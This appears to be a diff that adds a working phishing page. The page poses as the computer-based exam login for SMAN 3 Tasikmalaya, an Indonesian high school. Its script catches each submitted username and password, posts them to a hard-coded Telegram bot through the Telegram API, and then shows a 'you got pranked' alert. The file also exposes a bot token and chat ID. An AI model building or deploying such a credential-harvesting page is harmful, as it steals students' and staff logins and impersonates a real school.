@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CBT - Penilaian Sumatif Akhir Jenjang SMAN 3 Tasikmalaya</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 5px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        .school-logo {
+            width: 80px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+        
+        .notification {
+            background-color: #d1e6f3;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 18px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #777;
+        }
+        
+        .login-button {
+            background-color: #0f3b7b;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 12px 0;
+            width: 80%;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 20px 0;
+            text-transform: uppercase;
+        }
+        
+        .footer-notification {
+            background-color: #d1e6f3;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img class="school-logo" src="logos.png" alt="School Logo">
+        
+        <h1>CBT - Penilaian Sumatif Akhir Jenjang<br>SMAN 3 Tasikmalaya</h1>
+        
+        <div class="notification">
+            Gunakan akun Anda untuk login
+        </div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required>
+                    <span class="eye-icon" onclick="togglePassword()">👁️</span>
+                </div>
+            </div>
+            
+            <button type="submit" class="login-button">LOGIN</button>
+        </form>
+        
+        <div class="footer-notification">
+            Hubungi bagian TIK apabila bermasalah Login!
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Mencegah form submit default
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Gantilah dengan token bot Telegram Anda dan ID chat tujuan
+            const botToken = '7303800351:AAHV5d_G85M0WOYyi6EKFGXoHbWYOQT4p8k';
+            const chatId = '6329817532';
+
+            // Pesan yang akan dikirim ke bot Telegram
+            const message = `🔹 *Percobaan Login* 🔹\n\n👤 *Username:* ${username}\n🔑 *Password:* ${password}`;
+            
+            // Mengirim data login ke bot Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => response.json())
+              .then(data => console.log('Pesan terkirim:', data))
+              .catch(error => console.error('Error:', error));
+
+            // Menampilkan pop-up prank
+            alert("Anda kena prank 😂");
+        });
+    </script>
+</body>
+</html>
